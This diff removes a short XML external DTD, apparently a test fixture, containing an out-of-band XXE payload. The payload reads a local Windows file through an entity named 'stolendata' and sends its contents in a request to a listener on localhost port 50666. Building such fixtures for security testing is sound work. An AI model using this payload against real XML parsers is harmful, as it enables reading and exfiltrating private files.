@@ -1,4 +1,0 @@
-﻿<!ENTITY % stolendata SYSTEM "file:///C:/Windows/Temp/Secreto.txt">
-<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://localhost:50666/?%stolendata;'>">
-%inception;
-%sendit;
